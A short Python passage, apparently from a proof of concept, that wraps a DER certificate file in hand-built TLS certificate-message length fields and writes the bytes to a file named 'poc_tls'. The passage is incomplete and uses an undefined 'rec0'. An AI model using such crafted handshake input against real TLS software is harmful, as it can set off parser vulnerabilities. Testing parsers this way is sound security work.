cert=Path('pocwork/rawcert.der').read_bytes()

chain_len=len(cert)+3
hs_len=3+chain_len
record_len=4+hs_len
msg=bytearray()

msg += len(cert).to_bytes(3,'big') + cert
msg += b'\x00\x00'
Path('poc_tls').write_bytes(rec0+msg)
